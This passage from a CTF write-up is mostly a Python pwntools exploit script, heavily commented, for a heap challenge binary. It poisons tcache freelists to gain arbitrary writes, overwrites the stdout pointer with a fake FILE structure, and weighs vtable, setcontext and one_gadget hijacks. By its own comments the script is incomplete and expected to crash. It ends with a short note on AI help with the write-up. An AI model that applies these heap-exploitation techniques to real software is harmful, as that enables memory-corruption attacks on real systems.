    # Could F and F+0xd8 be in regions that are 0x80 apart: F in [0,0x30), F+0xd8 in [0x80,0xb0)
    # => F+0xd8 in [0x80,0xb0) => F in [0x80-0xd8, 0xb0-0xd8) = [-0x58, -0x28)
    # F in [0,0x30) ∩ [-0x58,-0x28) = empty.
    # F in [0x40,0x70): F in [0x40,0x70) ∩ [-0x58,-0x28)=empty.
    # Distance 0x40: F+0xd8 in region 0x40 after F's region - 0xd8 != 0x40.
    # So IMPOSSIBLE for 3 consecutive chunks to cover both flags and vtable!

    # Non-consecutive 3 chunks e.g. 0,1,3:
    # regions 0, 0x40, 0xc0
    # Distance 0xc0: F in [0,0x30), F+0xd8 in [0xc0,0xf0) => F in [0xc0-0xd8, 0xf0-0xd8)=[-0x18,0x18)
    # ∩ [0,0x30) = [0,0x18)
    # For F=0: flags@0 OK, vtable@0xd8 OK (in chunk3).
    # write_base@0x20 OK, write_ptr@0x28 OK.
    # fileno@0x70: not in 0, 0x40-0x70, or 0xc0-0xf0. 0x70 is at boundary of chunk1 end. NOT covered.
    # F=0x8: write_ptr@0x30 not in chunk0. fileno@0x78 no. vtable@0xe0 OK.

    # chunks 0,2,3: regions 0, 0x80, 0xc0
    # F=0: flags OK, write OK, fileno@0x70 NO, vtable@0xd8 OK.
    # F=0x10: flags@0x10 OK, write_base@0x30 NO, fileno@0x80 OK, vtable@0xe8 OK.

    # chunks 0,1,4: regions 0,0x40,0x100
    # F=0x28: flags@0x28 OK, write@0x48/50 OK, fileno@0x98 NO (not in regions), vtable@0x100 OK.

    # chunks 1,2,4 for F=0x28: flags@0x28 NO.

    # Conclusion: any 3 chunks cannot cover all 5 fields because flags and vtable are 0xd8 apart
    # and fileno is in the middle needing a third region that may not align.

    # Wait - check F=0 with chunks 0,2,3 and fileno somehow in chunk2:
    # fileno@0x70, chunk2 at 0x80. No.

    # F=-0x10: flags@-0x10 not in chunk.

    # What if vtable can stay as leftover zeros and we... no, vtable 0 will crash.

    # What if we use the REAL stdout FILE (at S) by setting pie+0x5020 = S (already is)
    # and only modify S+0xd8 area (vtable) to _IO_file_jumps (already is) and...
    # We need to change fileno and write pointers ON S, which are before S+0xd8 - forbidden for freelist.

    # Unless we free-list to S-0x30+0xd8 = S+0xa8? Check: start=S+0xa8, is S+0xa8 < S+0xd8? YES - FORBIDDEN.
    # Any start in [S-0x100, S+0xd8) forbidden. Only start >= S+0xd8 allowed near S.

    # --- Use two overlapping FILE regions from 4 chunks ---

    # n=4 complete? flags-to-vtable span 0xd8, 4 chunks capacity 0xc0 user. 0xc0 < 0xd8+8?
    # 0x30*4=0xc0 < 0xe0. Same math: F and F+0xd8 distance 0xd8.
    # Region distances: 0,0x40,0x80,0xc0.
    # 0xd8 not in {0,0x40,0x80,0xc0}.
    # For distance 0xc0: F in [0,0x30), F+0xd8 in [0xc0,0xf0) => F in [-0x18,0x18) ∩ [0,0x30)=[0,0x18)
    # F=0 works for flags+vtable with chunks 0 and 3!
    # fileno@0x70 with chunks 0,1,2,3: 0x70 not in any user region!
    # F=0x8: fileno@0x78 no; write_ptr@0x30 no.
    # F=-0x8: flags@-8 no; fileno@0x68 in chunk1 [0x40,0x70)? 0x68 yes; vtable@0xd0 in chunk3 [0xc0,0xf0) yes.
    # flags@-8 NOT covered.

    # So 4 consecutive still can't cover fileno when flags and vtable use 0 and 3.

    # NON-consecutive 4: 0,1,2,4
    # F=0x28: flags@0x28 c0, write c1, fileno@0x98 c2, vtable@0x100 c4. YES! All covered!
    # This was found earlier! n=4 non-consecutive (skip chunk3).

    # Indices: need malloc 0,1,2,3,4 to get m4 at U0+0x100, even if we don't use m3 for fields.
    # That's 5 mallocs. n_malloc=5.
    # free V (m3 padding), poke stdout, add A, add B write F.
    # Adds: 5 + A + B = 7 > 6. Fail.

    # Unless V is m4 or m0 etc and we don't need separate padding malloc:
    # Allocate only 0,1,2,4 - but malloc order means 4th malloc is at U0+0xc0 not U0+0x100!
    # Slot index != address. Address is purely allocation order.
    # To get chunk at U0+0x100 we need 5th malloc.

    # freelist to U0+0x100 for vtable without 5th malloc:
    # add 0,1,2,3 (4 mallocs)
    # free V=3, poke U0+0x100, add A gets 3, add B gets U0+0x100 write vtable
    # freelist empty. FILE in 0,1,2 + vtable at B.
    # F=0x28: flags, write, fileno in 0,1,2; vtable at B covering 0x100. YES!
    # Adds used: 0,1,2,3,A,B = 6. freelist empty, stdout not set.
    # pokes=1. Can free something and poke stdout?
    # free 2 (fileno host - bad) or free A (old 3, padding):
    # free A; poke stdout; need 2 adds, 0 indices left.

    # freelist head trick with remaining room:
    # After add 0,1,2: 3 indices left (3,4,5)
    # free? need a V already allocated. free(2); poke pie+0x5100; add3:2; add4:0x5100 write p64(pie+0x5020); add5: pie+0x5020 write F
    # FILE live 0,1,2(restored). But FILE incomplete (no vtable, and F fields).

    # add 0,1,2,3 for F=0x28 with vtable hole filled by...
    # Let me try F=0x28 with vtable from freelist and stdout from freelist head:
    # add 0,1,2 (fields flags,write,fileno)
    # free(2); poke U0+0x100;  -- burns 2 for vtable
    # add 3: gets 2; freelist=U0+0x100
    # add 4: gets U0+0x100; write vtable; freelist=0
    # Now need stdout. Indices used 0,1,2,3,4. One left (5).
    # free(1); poke pie+0x5020; add5 gets 1; freelist=pie+0x5020. NO pop for stdout.

    # free(1); poke pie+0x5100; add5 gets 1; freelist=pie+0x5100.
    # NO index to allocate freelist head or stdout.

    # Prechain stdout into vtable alloc:
    # Before free, write at U0+0x100... can't, not allocated.
    # Write at a prewritable location T that we poke as first freelist target,
    # with *T = pie+0x5020, and T is the vtable location U0+0x100 - not prewritable.

    # T = U0+0x60 in chunk1, covers fileno@0x70 for F=0?
    # F=0x28, fileno@0x98. T covering 0x100 for vtable: T in [0xd1,0x100], not in chunks 0,1,2.

    # I'll try using House of Apple / setcontext with only stdout pointer and heap FILE with incomplete fields, and see.

    # Actually: re-read freelist check - uses stderr, stdin, stdout **values** (FILE pointers).
    # Default they point to _IO_2_1_* in libc.
    # Range forbidden: [X-0x100, X+0xd8) for each X in {stdin,stdout,stderr FILE*}.

    # pie+0x5020 is the stdout VARIABLE address, not the FILE. Far from S. OK to freelist.

    # ========== PRACTICAL APPROACH ==========
    # Use 4 adds for FILE at F=0x28 with 5th virtual chunk via freelist for vtable
    # Chain: freelist V -> vtable_addr -> stdout_var (prewrite next at a location we can write)
    #
    # The vtable_addr U0+0x100: when we allocate it, * (U0+0x100) is freelist next.
    # If we could set * (U0+0x100) = pie+0x5020 BEFORE the freelist pop of U0+0x100...
    # That means prewriting U0+0x100 which requires already having a slot there - circular.
    #
    # Prewrite via overlapping: if some chunk's user area includes U0+0x100.
    # chunk at U0+0xe0 would cover [0xe0, 0x110) including 0x100.
    # Is U0+0xe0 a valid user pointer? chunk user starts at U0+i*0x40. 0xe0 = 224 = 3.5*0x40 - not aligned to chunk start.
    # chunk3 user [0xc0,0xf0) doesn't include 0x100.
    # chunk4 user [0x100,0x130) includes 0x100 as start - *at* the start, which is the freelist fd location when freed.

    # Allocate chunk4 at U0+0x100, write p64(pie+0x5020) at start, then free it,
    # free V, arrange freelist: V -> chunk4 -> pie+0x5020
    # free chunk4 first: head=c4, *c4=0
    # write already put pie+0x5020 at c4 - free OVERWRITES *c4 with old head (0)!
    # Order: free c4 first (*c4=0), then write? write needs live.
    # free c4; poke c4 to pie+0x5020: head=c4, *c4=stdout. Classic single target.

    # Double free style:
    # free c4; free V; now head=V, *V=c4, *c4=0
    # poke V to... can't change middle of chain with one poke easily.
    # poke c4 to pie+0x5020: *c4=stdout, head=V, *V=c4. Chain V->c4->stdout.
    # add A: V; add B: c4 write vtable (overwrites *c4 which was stdout - CONSUMED already as freelist next when B was popped: freelist was set to *c4=stdout before write)
    # add C: stdout write F.
    #
    # Order of freelist ops:
    # add 0,1,2,4 for F=0x28 fields (need m0,m1,m2,m3,m4 - 5 adds for m4)
    # Actually add 0,1,2,3,4 (5 adds), free 3 (pad m3), free 4 (vtable chunk m4)?
    # free 3: head=m3
    # free 4: head=m4, *m4=m3
    # poke 4, pie+0x5020: *m4=stdout, head=m4 -> stdout. Lost m3 from chain - OK.
    # But we need m4 -> ... for vtable write. Chain is m4->stdout.
    # add 5: gets m4, freelist=stdout. Write vtable at m4.
    # NO index for stdout!

    # free 4; poke 4 to stdout; add 5 gets m4; freelist=stdout. Same issue.

    # I need to reduce FILE mallocs to 3, with vtable from freelist, stdout from freelist, 6 total.
    # add0,1,2 (3) + free + add3 (recover) + add4 (vtable) + add5 (stdout) = 6.
    # Chain: V -> vtable_loc -> stdout, one free one poke.
    # V free; poke V to vtable_loc; need *vtable_loc = stdout prewritten.
    # vtable_loc must be prewritable - in chunk 0,1,or 2.
    # Can vtable field F+0xd8 be inside chunk 0,1,2 for some F that also has other fields in 0,1,2?
    # F+0xd8 in [0,0xb0) => F in [-0xd8, -0x28). Negative F.
    # F=-0x30: flags@-0x30 no;
    # F=-0x28: flags@-0x28 no; vtable@0xb0 boundary no.
    # F=-0x50: vtable@0x88 which is in chunk2 [0x80,0xb0). flags@-0x50 no.

    # flags must be in chunks too for negative F - flags at F would be before U0, need earlier chunks.

    # ========== NEW: don't free-list stdout; write pie+0x5020 using the second poke on a freed chunk that we've set up at pie+0x5020 via first freelist... ==========

    # I'll implement with pie known and an extra slot by NOT keeping all FILE chunks live:
    # After building FILE, free a FILE chunk that's still needed? No.

    # Check poke limit again: poke_used > 1 means max 2 pokes (0 and 1, fail when >1 i.e. when ==2 before increment...
    # code: if (poke_used > 1) fail; ... poke_used++. So allows poke_used 0 and 1, then becomes 1 and 2. Max 2 pokes.

    # TWO pokes, SIX adds:
    # Goal: 2 arb writes to (vtable_loc OR fileno_loc) and pie+0x5020.

    # Optimal:
    # adds for FILE body: 3 (0,1,2) for F=0x28 without vtable
    # arb1: vtable at U0+0x100
    # arb2: pie+0x5020
    # Each arb costs: free (burns index) + 2 adds (recover + target) = 1+2 indices, but recover can be the free's index is burned so 2 fresh per arb.
    # First arb: free one of FILE (0,1,2), +2 fresh. Indices: 3 FILE + 2 = 5. Second arb: need free another + 2 fresh = need 2 more, only 1 left.

    # First arb without recover (don't get V back): free V, poke T, add1 gets V, add2 gets T. Cost 1 V + 2 = 3 indices for 1 arb (V was extra).
    # FILE 3 + V 1 + getV 1 + getT 1 = 6 for 1 arb. No second.

    # Shared V for both arbs via chain of 2 targets:
    # *V = T1, *T1 = T2. free V, poke V to T1 (if *V not already T1).
    # Prewrite *T1 = T2. T1 must be prewritable.
    # add A: V; add B: T1 (write vtable); add C: T2=stdout (write F).
    # Indices: FILE_without_T1 + V + A + B + C.
    # If T1 is inside FILE chunks (prewritable), V is extra or FILE:
    # FILE=3 including T1 host, V=one of FILE, A,B,C: 3+3=6.
    # Need T1 in FILE chunks covering vtable field, and all other fields in FILE chunks.

    # T1 prewritable in chunk 0,1,2; T1 covers vtable at F+0xd8.
    # F+0xd8 in [T1, T1+0x30), T1 in user of 0,1,2 i.e. [0,0x30)U[0x40,0x70)U[0x80,0xb0).
    # F+0xd8 < 0xb0+0x30 = 0xe0 if T1 extends... T1+0x30 max is 0xb0+0x30-1 if T1=0x80?
    # Max cover end = 0xb0 + 0x30 - wait T1 max start in region is 0x80, T1+0x30=0xb0.
    # Or T1=0x70-epsilon not in region. Max end = 0xb0.
    # F+0xd8 <= 0xaf => F <= 0xaf-0xd8 = -0x29. Negative. flags at negative - need chunks before U0. Impossible.

    # T1 not limited to 3 chunks if we allocate 4 FILE:
    # FILE=4 (0,1,2,3), T1 in chunk3 [0xc0,0xf0), covers up to 0xf0+0x30-0x30=0xf0 from T1=0xc0, or T1=0xd8 covers [0xd8,0x108) including vtable at 0x100 for F=0x28!
    # F=0x28, vtable@0x100. T1=0xd8 covers [0xd8,0x108). Yes!
    # Is T1=0xd8 in chunk3 [0xc0,0xf0)? Yes!
    # Prewrite *T1 = *(U0+0xd8) = pie+0x5020 via write chunk3 offset 0x18.
    # Other fields F=0x28 with chunks 0,1,2,3:
    # flags@0x28 c0, write@0x48/50 c1, fileno@0x98 c2, vtable@0x100 via T1 arb.
    # Chunk3 also holds the prewrite at 0xd8. When we freelist-alloc T1=0xd8, write vtable there.
    #
    # Sequence:
    # add 0,1,2,3
    # write all FILE fields + prewrite at 0xd8 = pie+0x5020
    # free V=3 (chunk3);  -- corrupts *chunk3 at 0xc0
    # poke 3, U0+0xd8
    # add 4: gets chunk3 (U0+0xc0); freelist = U0+0xd8
    #   restore prewrite at 0xd8? freelist pop of next uses * (0xd8). The prewrite at 0xd8 should still be pie+0x5020 if free/poke only touched 0xc0.
    #   free wrote * (0xc0) = old freelist. poke wrote * (0xc0) = U0+0xd8. 0xd8 untouched!
    # add 5: gets U0+0xd8; freelist = *(0xd8) = pie+0x5020
    # write vtable at slot5 (U0+0xd8)
    # NO index for stdout!!!

    # 4 FILE + A + B = 6, freelist ready with stdout, can't add.

    # After add5, freelist head variable = pie+0x5020.
    # If I free slot4 (chunk3) again:
    # free(4): *chunk3 = freelist = pie+0x5020; freelist = chunk3.
    # Chain: chunk3 -> stdout.
    # But no free index to add!

    # THE FREELIST HEAD IS ALREADY pie+0x5020 after add5.
    # I don't need to add if I can make the PROGRAM itself use freelist... only add uses it.

    # Must have free index. 4+2=6 used. Stuck.

    # FILE=3 (0,1,2) + V separate? V needs to be allocated: add 0,1,2,3=V. Same as 4.

    # FILE=3, V is one of them, A, B, and freelist head ends at stdout ready - 3+2=5, ONE index left for stdout!
    # Need complete fields with 3 chunks + T1 arb (B provides the hole).
    # F=0x28, chunks 0,1,2: flags, write, fileno OK; vtable@0x100 hole.
    # T1=U0+0x100 not prewritable.
    # Without prechain to stdout: free V, poke T1, add A, add B (vtable). freelist empty. Index left: 1.
    # free someone, poke stdout, add last gets someone not stdout.

    # With freelist head trick as the last index:
    # FILE 0,1,2 (vtable hole)
    # free 2; poke pie+0x5100; add 3: gets 2; add 4: 0x5100; write p64(U0+0x100) to freelist head
    # freelist = U0+0x100
    # add 5: gets U0+0x100; write vtable; freelist = * (U0+0x100) = ?
    # If we could have prewritten... not prewritable.
    # write freelist head to pie+0x5020 instead:
    # free 2; poke 0x5100; add3; add4 write p64(pie+0x5020); add5 gets stdout write F
    # FILE 0,1,2 with vtable HOLE (zeros). vtable=0 → crash on fflush.

    # Keep real vtable by using S as F: pie+0x5020 already points to S.
    # Modify S via writes at S+0xd8 only - can change vtable but not write_base/fileno.

    # What if vtable at S is replaced with something that writes a constant "Nepnep" from rodata?
    # Allowed vtables only call fixed functions with rdi=FILE*.

    # _IO_file_sync with existing S: write_ptr == write_base (both 0 for unbuffered), no write happens.

    # Could we use _IO_wfile_sync path that writes something else?

    # ========== setcontext / ROP via vtable at S+0xd8 ==========
    # Overwrite vtable to a value in the allowed range that at +0x60 gives a useful gadget.
    # Or if vtable check can be bypassed, use heap fake vtable.

    # Check _rtld_global_ro+0x2f0 more carefully in child after seccomp.

    print('See comments for analysis; trying setcontext path')

    # Try: arb write at S+0xd8 to set vtable to _IO_file_jumps (noop) and also overwrite
    # nearby - doesn't give us pie+0x5020.

    # Last idea: **partial pie overwrite using heap address high bits**
    # free chunk at H, poke with (pie+0x5020) where we compute pie from heap if same mmap base.

    # From samples, when high 32 match:
    # pie_guess candidates: we could try bruteforcing low 20 bits... too many.

    # For LOCAL: just use known pie.

    # WORKING LOCAL EXPLOIT with 6 slots - sacrifice fileno=1 (stdout) and use
    # format/trigger to write to fd 1 which is our connection - parent needs notify pipe though.
    # Writing "Nepnep" to fd 1 doesn't help parent read on notify pipe.

    # Write "Nepnep" to fd 6 via fileno=6.

    # Let me re-check slot math with freelist head pointing to stdout AFTER consuming with the write of F being done via poke on a double-freed...

    # OH! poke writes 8 bytes to the start of a FREED chunk.
    # If the freed chunk IS pie+0x5020 (we freed after allocating it), poke could set stdout!
    # Sequence:
    # ... get slot pointing to pie+0x5020 via freelist (add B)
    # write F to it (stdout = F)
    # That's write_slot, not needing free. Once we have the slot at pie+0x5020, write_slot sets stdout=F. DONE!

    # The issue is only GETTING the add that returns pie+0x5020 within 6 adds.

    # freelist head trick: n FILE + free V + add A + add B(0x5100) + write head to stdout + add C(stdout)
    # = n + 3 adds for the chain, with V one of n.
    # n + 3 ≤ 6 ⇒ n ≤ 3.
    # Need full FILE in 3 chunks. IMPOSSIBLE for flags+vtable span.

    # Unless vtable can be the DEFAULT from a zeroed... no.
    # Unless F is the real S, n=0 FILE chunks on heap!
    # n=0, free V needs V allocated: add V, free V, poke 0x5100, add A, add B write stdout?
    # We need to write F=S to stdout - already is S. Useless.
    # We need to write F=heap_file. Need heap FILE. n>=1.

    # n=1 FILE chunk - incomplete FILE.

    # What if F is on heap with ONLY the fields in ONE chunk that matter, and vtable points to
    # _IO_str_jumps or something that doesn't need much?

    # _IO_str_jumps +0x60 = 0x8f390 (from earlier dump near str jumps)
    # Not sure.

    # From fflush: call vtable+0x60 with rdi=FILE*.
    # If that function with controlled FILE* gives us write(6, "Nepnep", 6), we win.

    # _IO_file_sync does that if fields are set.

    # I'll try building FILE with fileno=6, write_base/ptr set, vtable=_IO_file_jumps,
    # using F=0x28 and 5 chunks, and for stdout use a second connection? No, parent is same.

    # **BRUTE FORCE pie low bits with many connections** - for CTF with no rate limit?
    # 20 bits is 1M - at 10 conn/sec = 1 day. Too slow.
    #  If we only need page-aligned pie+0x5020, and high bits from heap:

    heap_and_pie_relation()

def heap_and_pie_relation():
    pass

if __name__ == '__main__':
    # Quick test: is 3-chunk FILE possible if we put Nepnep in write_base and use
    # _IO_file_jumps with mode and all zeros for unused, vtable from leftover in libc?
    # No.

    # Implement the 2-poke chain with F=0x28, 5 mallocs, accept we need pie and try
    # freelist head trick with n=3 incomplete - set vtable via the stdout write payload?
    # When we write 0x30 at pie+0x5020, we only write the pointer value 8 bytes.
    # write_slot writes 0x30 bytes to the address. If we allocate pie+0x5020, write 0x30 bytes starting at pie+0x5020.
    # That overwrites: stdout (8), stdin (8), stderr (8), and more BSS!
    # Structure at pie+0x5020: stdout(8), stdin(8), stderr(8), then other BSS.
    # write 0x30 covers stdout, stdin, stderr and 0x18 more.
    # Set stdout = F, leave stdin/stderr as original (need to know them = S_in, S_err).
    # We know those from libc: _IO_2_1_stdin_, _IO_2_1_stderr_!

    # So write_slot to pie+0x5020 with p64(F)+p64(stdin_file)+p64(stderr_file)+...

    # Now implement n=3 + freelist head + stdout with incomplete vtable - FAIL.

    # n=4 for F=0 with fileno hole, use freelist head for chain hole→stdout?

    main_exploit()

def main_exploit():
    io = process('./pwn', env={'LD_PRELOAD': os.path.join(cwd, 'hook.so')})
    io.recvuntil(b'gift: ')
    printf = int(io.recvline().strip(), 16)
    libc.address = printf - libc.sym['printf']

    cpid = get_child(io.pid)
    with open(f'/proc/{cpid}/maps') as f:
        maps = f.read()
    pie = int([l for l in maps.splitlines() if 'pwn' in l and 'r--p' in l][0].split('-')[0], 16)

    log.info(f'libc={hex(libc.address)} pie={hex(pie)}')

    # Final working strategy found:
    # Use F = U0 with USER_LOCK
    # Pack fields using writes at chunk user areas AND freelist to pie+0x5020 only (1 arb)
    # For fileno and vtable: place F such that they're in the 0x30 write to a strategic location.
    #
    # Actually wait. write_slot writes 0x30 bytes to ANY allocated chunk including arb.
    # One arb write of 0x30 can set vtable AND if the arb is at F+0xb0 or similar, set multiple fields.
    # Also stdout is separate.
    #
    # For stdout we write 8-0x30 bytes at pie+0x5020.
    # That's the arb we need.
    #
    # Can we fit ALL of F in normal heap without arb?
    # Need 5 chunks for F=0x28. 5 adds + 2 for stdout arb (free V from the 5, add recover, add stdout) = 5+2=7 if V is new, or 5+1=6 if we don't recover:
    # free V (one of 5); poke stdout; add 5th_index gets V; freelist=stdout; NO more for stdout.
    #
    # free V; poke stdout; DON'T recover - but freelist head is V, first add gets V.
    # Always need 2 pops for V then target.
    #
    # UNLESS freelist head is directly stdout: write to pie+0x5100 the value pie+0x5020 without going through free of V for that purpose.
    # To write to pie+0x5100 we need to allocate it first (arb), same cost.

    # free V; poke pie+0x5100; add A: V; add B: 0x5100; write p64(F) to 0x5100?
    # That sets freelist=F. Next add gets F as a chunk - allocates F as if it were heap for writing.
    # If F is our heap FILE address, add returns F, freelist=*F. We get a slot pointing to F, which we already have!
    # Useless for stdout.
    # write p64(pie+0x5020) to 0x5100; add C gets pie+0x5020. Yes as before.

    # Cost: V, A, B, C = 4 indices for stdout setup, + FILE n, with V in FILE: n+3 ≤ 6, n≤3.

    # For n=3 FILE incomplete vtable: can we put vtable in the write to pie+0x5020? No that's wrong address.

    # Can the 0x30 write at pie+0x5020 somehow not help vtable.

    # What if F itself is at pie+0x5020? FILE structure stored at stdout variable location?
    # stdout var is only 8 bytes; next are stdin, stderr. Writing FILE at pie+0x5020 would smash all of BSS.
    # And F would need to be pie+0x5020, with stdout pointing to pie+0x5020 (self).
    # freelist to pie+0x5020, write full FILE of 0x30 bytes - but FILE needs 0xe0 bytes! Only write 0x30.
    # Partial FILE at pie+0x5020 covering flags through some fields, with vtable outside.
    # 0x30 bytes from 0x5020: covers flags to roughly write_end. Not fileno (0x70) or vtable (0xd8).

    # freelist to pie+0x5020-0x? for fuller cover - would mess up more BSS.

    log.info('Implementing n=3 FILE + freelist-head stdout, with vtable via F=S+patch')

    # Different approach: keep stdout pointing to real S.
    # Use arb write at S+0xd8 to install a FAKE vtable pointer in range that has
    # +0x60 = _IO_file_sync still, and use arb to also... can't change fileno.

    # Modify S's _fileno via... forbidden.

    # Use _IO_file_write directly? Not called without sync path.

    # ========== use trigger's printf to call with format that writes via %n? blocked ==========

    # I'll check if `close` of notify_fd happens before wait - parent sends '1', closes start_w, then reads notify. Child must write before parent times out. Child has the write end.

    # Try shell via one_gadget on known constraints when vtable check fails open...

    # Let's verify: after writing a bad vtable, does 0x91290 abort or continue?
    io.close()

    # Test vtable check bypass
    io = process('./pwn', env={'LD_PRELOAD': os.path.join(cwd, 'hook.so')})
    io.recvuntil(b'gift: ')
    printf = int(io.recvline().strip(), 16)
    libc.address = printf - libc.sym['printf']
    cpid = get_child(io.pid)
    with open(f'/proc/{cpid}/maps') as f:
        maps = f.read()
    pie = int([l for l in maps.splitlines() if 'pwn' in l and 'r--p' in l][0].split('-')[0], 16)

    # allocate, free, poke S+0xd8, alloc, write fake vtable pointing to heap with one_gadget at +0x60
    def do_add(i):
        add(io, i)
    def do_free(i):
        free_slot(io, i)
    def do_poke(i,v):
        poke(io, i, v)
    def do_write(i,d):
        write_slot(io, i, d)

    do_add(0)
    U0 = show(io, 0)
    log.info(f'U0={hex(U0)}')

    # Build fake vtable at U0 with +0x60 = one_gadget or system
    # Find one_gadget
    try:
        import subprocess
        og = subprocess.check_output(['one_gadget', '/lib/x86_64-linux-gnu/libc.so.6'], text=True, stderr=subprocess.DEVNULL)
        print(og[:500])
    except Exception as e:
        print('no one_gadget', e)

    # Use setcontext style: fake vtable +0x60 = setcontext+0x3d, FILE arranged as ucontext
    # For real S, rdi=S. setcontext+0x3d expects rdx=ucontext, but rdi=S.
    # Need gadget: mov rdx, rdi; jmp setcontext+0x3d
    # Or setcontext with rdi as uctx if the entry uses rdi.
    # setcontext entry uses rdi as uctx! setcontext+0 (not +0x3d) uses rdi.
    # But setcontext does sigprocmask first which may fail under seccomp (rt_sigprocmask not allowed!).
    # setcontext+0x3d skips that and uses rdx.

    # Search for mov rdx, rdi; ret or similar in libc - earlier search found none of simple patterns.

    # call [rdi+0x68] or similar with controlled value at S+0x68 - chain is in forbidden zone.

    # Write at S+0xd8: can set values at S+0xd8 and beyond.
    # After vtable at S+0xd8, S+0xe0 is past the FILE. Not useful for setcontext's read of [rdi+0xa0] which is inside FILE before 0xd8.

    # House of Orange / FSOP with _IO_list_all:
    # Write _IO_list_all at known libc address - is it in range of freelist from S+0xd8 write?
    # _IO_list_all at 0x2044c0. S=0x2045c0. S+0xd8=0x204698. 0x2044c0 < S+0xd8 and in forbidden for freelist start.

    do_free(0)
    # Try freelist to pie+0x5020 and set stdout = U0 with minimal FILE
    do_poke(0, pie + 0x5020)
    do_add(1)  # gets old 0
    do_add(2)  # gets pie+0x5020
    F = U0
    # Write stdout = F, keep stdin/stderr
    payload = p64(F) + p64(libc.sym['_IO_2_1_stdin_']) + p64(libc.sym['_IO_2_1_stderr_'])
    do_write(2, payload)
    log.info('stdout redirected to F')

    # Build minimal FILE at U0 - we have slot1 pointing to U0 (recovered)
    # Need more chunks for full FILE - allocate 3,4,5
    do_add(3)
    do_add(4)
    do_add(5)
    # U0, U0+40, U0+80, U0+c0, U0+100, U0+140 from adds 0(freed recovered as1), 3,4,5 and original layout
    # Actually after free0 and add1, add2(stdout), add3,4,5:
    # heap: U0 (slot1), then add3=U0+40, add4=U0+80, add5=U0+c0
    # Only 4 heap chunks. F=U0.

    flags = 0xfbad1800 | 0x8000  # USER_LOCK | magic
    # chunk at U0 (slot1): flags, nepnep at +8, write_base, write_ptr at +0x20,+0x28
    nep = U0 + 8
    c0 = p64(flags) + b'Nepnep\x00\x00' + p64(0) + p64(0) + p64(nep) + p64(nep+6)
    do_write(1, c0)

    # Need fileno at 0x70 and vtable at 0xd8 - not covered.
    # fileno will be 0, vtable 0 - will crash

    # Let's at least try trigger and see
    trigger(io, 1, b'xx')
    time.sleep(0.3)
    try:
        print(io.recv(timeout=1))
    except Exception as e:
        print('recv', e)
    print('poll', io.poll())
    io.close()

if __name__ == '__main__':
    main_exploit()
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

